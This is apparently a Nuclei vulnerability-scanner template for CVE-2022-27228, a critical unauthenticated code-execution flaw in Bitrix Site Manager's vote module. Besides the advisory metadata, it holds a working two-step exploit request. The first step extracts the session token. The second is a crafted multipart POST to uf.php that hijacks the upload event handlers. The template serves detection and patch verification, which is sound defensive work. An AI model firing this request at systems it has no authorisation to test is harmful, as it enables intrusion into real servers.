id: CVE-2022-27228

info:
  name: Bitrix Site Manager - Remote Code Execution
  author: theamanrawat
  severity: critical
  description:
    Bitrix Site Manager before 21.0.100 contains a remote code execution caused by insufficient input validation in the vote module, letting unauthenticated attackers execute arbitrary code, exploit requires no authentication.
  impact:
    Unauthenticated attackers can execute arbitrary code remotely, potentially leading to full system compromise.
  remediation:
    Update to version 21.0.100 or later.
  reference:
    - https://alt3r.eg0.ru/p0c5/attacking_bitrix.pdf
    - https://pentestnotes.ru/notes/bitrix_pentest_full/#rce-vote_agentphp-cve-2022-27228
    - https://nvd.nist.gov/vuln/detail/CVE-2022-27228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-27228
    cwe-id: CWE-20
  metadata:
    verified: false
    shodan-query: "/bitrix/p3p.xml"
  tags: cve,cve2022,bitrix,fileupload,rce,intrusive,kev

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /bitrix/admin/ HTTP/2
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "contains(body, 'bitrix_sessid')"
        internal: true

    extractors:
      - type: regex
        group: 1
        name: session_id
        regex:
          - "'bitrix_sessid':'(.*?)'"
        internal: true

  - raw:
      - |
        POST /bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote HTTP/2
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------xxxxxxxxxxxx

        -----------------------------xxxxxxxxxxxx
        Content-Disposition: form-data; name="bxu_files[bitrix50][NAME]"

        test.txt
        -----------------------------xxxxxxxxxxxx
        Content-Disposition: form-data; name="bxu_files[bitrix50][NAME]";filename="image.jpg"
        Content-Type: image/jpeg

        123
        -----------------------------xxxxxxxxxxxx
        Content-Disposition: form-data; name="bxu_info[packageIndex]"

        pIndex101
        -----------------------------xxxxxxxxxxxx
        Content-Disposition: form-data; name="bxu_info[mode]"

        upload
        -----------------------------xxxxxxxxxxxx
        Content-Disposition: form-data; name="sessid"

        {{session_id}}
        -----------------------------xxxxxxxxxxxx
        Content-Disposition: form-data; name="bxu_info[filesCount]"

        1
        -----------------------------xxxxxxxxxxxx--

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "\"status\":\"done\"")'
        condition: and
